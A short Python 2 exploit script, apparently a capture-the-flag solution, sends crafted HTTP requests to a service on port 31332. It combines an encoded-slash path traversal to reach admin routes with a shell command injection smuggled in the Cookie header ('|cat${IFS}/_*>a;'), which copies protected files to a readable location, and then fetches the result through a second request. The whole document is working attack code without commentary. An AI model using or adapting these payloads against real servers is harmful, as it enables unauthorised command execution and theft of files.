import socket
from struct import pack,unpack
from ctypes import c_int32
import telnetlib

import time
import sys
LOCAL = (sys.argv[1],31332)
BUFFER = 4096



s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(LOCAL)
PAYLOAD = "GET /guest/hello%2Fadmin%2Fsecret HTTP/1.1\r\n"
PAYLOAD += "Cookie: user=|cat${IFS}/_*>a;"
PAYLOAD +="\r\n\r\n"
s.send(PAYLOAD)
print s.recv(BUFFER)
s.close()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(LOCAL)
PAYLOAD = "GET /guest/hello%2Fadmin%2Flog HTTP/1.1\r\n"
PAYLOAD += "Cookie: user=a;"
PAYLOAD +="\r\n\r\n"
s.send(PAYLOAD)
print s.recv(BUFFER)
s.close()
